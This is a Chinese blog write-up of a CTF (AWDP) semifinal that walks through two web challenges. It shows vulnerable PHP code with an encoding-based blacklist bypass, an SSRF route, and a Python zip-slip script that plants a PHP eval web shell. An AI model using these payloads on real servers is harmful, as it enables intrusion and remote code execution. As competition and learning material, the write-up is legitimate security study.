---
title: "2026长城杯AWDP半决赛WP(西南地区WEB) - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2026/03/23/2026%e9%95%bf%e5%9f%8e%e6%9d%afawdp%e5%8d%8a%e5%86%b3%e8%b5%9bwp%e8%a5%bf%e5%8d%97%e5%9c%b0%e5%8c%baweb/"
author:
  - "[[Rycarl]]"
published:
created: 2026-06-09
description: "本次比赛的题目可以在https://github.com/CTF-Archives/2025-CCB-CISCN-Semis下载 前言 感恩老学长，这次被带进决赛了。 这次一共两个break和一个fix 运气特别好，当时第二轮MediaDrive那里我就试一试把上传目录改了就修复成功，然后大概..."
tags:
  - "clippings"
---
---
title: "2026长城杯AWDP半决赛WP(西南地区WEB) - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2026/03/23/2026%e9%95%bf%e5%9f%8e%e6%9d%afawdp%e5%8d%8a%e5%86%b3%e8%b5%9bwp%e8%a5%bf%e5%8d%97%e5%9c%b0%e5%8c%baweb/"
author: "[[Rycarl]]"
published: ""
created: "2026-06-09T21:08:11+08:00"
description: "本次比赛的题目可以在https://github.com/CTF-Archives/2025-CCB-CISCN-Semis下载 前言 感恩老学长，这次被带进决赛了。 这次一共两个break和一个fix 运气特别好，当时第二轮MediaDrive那里我就试一试把上传目录改了就修复成功，然后大概..."
tags: [clippings]
---

# 2026长城杯AWDP半决赛WP(西南地区WEB) - Rycarls little blog

## 2026长城杯AWDP半决赛WP(西南地区WEB)

5,803次阅读

[

没有评论

](#comments)

共计 2569 个字符，预计需要花费 7 分钟才能阅读完成。

本次比赛的题目可以在 `https://github.com/CTF-Archives/2025-CCB-CISCN-Semis` 下载

## 前言

感恩老学长，这次被带进决赛了。  
这次一共两个 break 和一个 fix  
运气特别好，当时第二轮 MediaDrive 那里我就试一试把上传目录改了就修复成功，然后大概第四轮就 break 了，狠狠得吃。  
希望到时候决赛部分师傅们能轻点虐 orz

![2026 长城杯 AWDP 半决赛 WP(西南地区 WEB)](https://image.rycarl.cn:9000/pic/qq_pic_merged_1774253167533.jpg "2026 长城杯 AWDP 半决赛 WP(西南地区 WEB)")

## MediaDrive

```php
<?php

#Preview.php

declare(strict_types=1);

require_once __DIR__ . "/lib/User.php";

require_once __DIR__ . "/lib/Util.php";

 

$user = null;

if (isset($_COOKIE['user'])) {$user = @unserialize($_COOKIE['user']);

}

 

if (!$user instanceof User) {$user = new User("guest");

    setcookie("user", serialize($user), time() + 86400, "/");

}

 

$f = (string)($_GET['f'] ?? "");

if ($f === "") {http_response_code(400);

    echo "Missing parameter: f";

    exit;

}

 

$rawPath = $user->basePath . $f;

 

if (preg_match('/flag|/flag|..|php:|data:|expect:/i', $rawPath)) {http_response_code(403);

    echo "Access denied";

    exit;

 

}

 

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);

 

if ($convertedPath === false || $convertedPath === "") {http_response_code(500);

    echo "Conversion failed";

    exit;

 

}

 

$content = @file_get_contents($convertedPath);

 

if ($content === false) {http_response_code(404);

    echo "Not found";

    exit;

 

}

 

$displayRaw = $rawPath;

$displayConv = $convertedPath;

$isText = true;

 

for ($i=0; $i<min(strlen($content), 512); $i++) {$c = ord($content[$i]);

    if ($c === 0) {$isText = false; break;}

}

 

?>
```

## FIX

扫描发现 preview.php 存在 `$content = @file_get_contents($convertedPath);` 且参数可控  
当时比赛直接把 `$rawPath = $user->basePath . $f;` 改成 `$rawPath = "/var/www/html/uploads/" . $f;`  
就修复成功了

## break

`$rawpath` 由两部分组成，一部分是从 cookie 中取出 basepath，一部分时从参数 `f` 中获取

用户目录反序列化后存储在 cookie 里面，修改 basepath 为 /  
但是这里存在一个黑名单，但是题目中提示了 `  编码转换  ` 所以可以尝试使用编码转换的特性绕过黑名单  
`$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);`  
这里会将转换失败的符号直接忽略掉，相当于置空  
使用 `f=fl%dfag` 绕过黑名单  

## easy\_time

## break

观察 dockerfile 发现起了两个 web 服务。  
一个是对外开放的 python，还有一个是内部的 php 服务  
那么很明显要打 ssrf 了  
发现加载远程头像的地方存在 ssrf

```python
def fetch_remote_avatar_info(url: str):

    if not url:

        return None

 

    parsed = urllib.parse.urlparse(url)

    if parsed.scheme not in {"http", "https"}:

        return None

    if not parsed.hostname:

        return None

 

    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "question-app/1.0"})

    try:

        with urllib.request.urlopen(req, timeout=3) as resp:

            content = resp.read()

            return {

                "content_snippet": 'None',

                "status": getattr(resp, "status", None),

                "content_type": resp.headers.get("Content-Type", ""),"content_length": resp.headers.get("Content-Length",""),

            }

 

    except Exception:

        return None
```

可以读取 php 服务  
但是就算读取了也没啥作用  
但是插件上传存在 `zipsilp`  
构造恶意压缩包

```
import zipfile  

 

with zipfile.ZipFile('zipslip.zip', 'w') as zf:  

    zf.writestr('../../../../../../var/www/html/1.php', "<?php @eval($_GET['123']); ?>")
```

上传后会再配合 ssrf 的地方读取 flag 即可

但是这道题比较坑的是 flag 在 /tmp 里面（当时找了半天才找到）

## FIX

照理来说应该把加载远程头像和上传压缩包功能禁掉就行（我是直接注释掉了）  
但是最后 10 次机会全用完了都不行，还是漏洞利用成功

正文完

0

版权声明：本站原创文章，由 于2026-03-23发表，共计2569字。

转载说明：除特殊说明外本站文章皆由CC-4.0协议发布，转载请注明出处。